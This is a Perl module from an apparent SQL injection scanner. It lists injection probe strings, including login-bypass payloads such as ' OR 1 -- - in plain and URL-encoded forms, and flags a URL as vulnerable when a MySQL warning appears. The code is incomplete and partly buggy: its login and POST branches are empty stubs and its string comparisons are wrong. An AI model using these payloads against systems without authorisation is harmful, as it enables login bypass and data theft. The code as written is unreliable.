package mod_SQLi;

use mod_Curl;
use String::Compare;

sub test {
	my ($url, $met, $pos) = @_;
	if($met) { my $method = $met }
	if($pos) { my $post = $pos }
	
	print $url;
	my $p1 = mod_Curl::req($url);
	sleep(5);
	print $met;
	my $p2 = mod_Curl::req($met);
	
	print compare($p1,$p2);

	
	my @strings_f = ("'", "\"", "\\", ";", "%27", "%22", "%5C", "%3B");
	my @strings_t = ("''", "\"\"", "\\\\", "%27%27", "%22%22", "%5C%5C");
	my @numeric_f = ("AND 0", "AND%200");
	my @numeric_t = ("AND 1", "AND%201");
	my @numeric_1 = ("2-1");
	my @numeric_3 = ("3-2");
	my @login = ("' OR '1", "' OR 1 -- -", "\" OR \"\" = \"", "\" OR 1 = 1 -- -", "'='", "'LIKE'", "'=0--+",
					"%27%20OR%20%271", "%27%20OR%201%20--%20-", "%22%20OR%20%22%22%20%3D%20%22", "%22%20OR%201%20%3D%201%20--%20-",
					"%27%3D%27", "%27LIKE%27", "%27%3D0--%2B");
	
	if($met) {
		if($met == "login") {
			# ...
		}
		if($pos && $met == "post") {
			# ...
		}
	} else {
		foreach $test (@strings_f) {
			$page = mod_Curl::req($url."".$test);
			if($page =~ m/Warning/ && $page =~ m/mysql/) {
				my $tipo = "MySQL";
				return "\n\r** Vulnerable **\n\rTipo:\t$tipo\n\rURL:\t$url$test\n\r";
			}
		}
	}
}
			
1;
__END__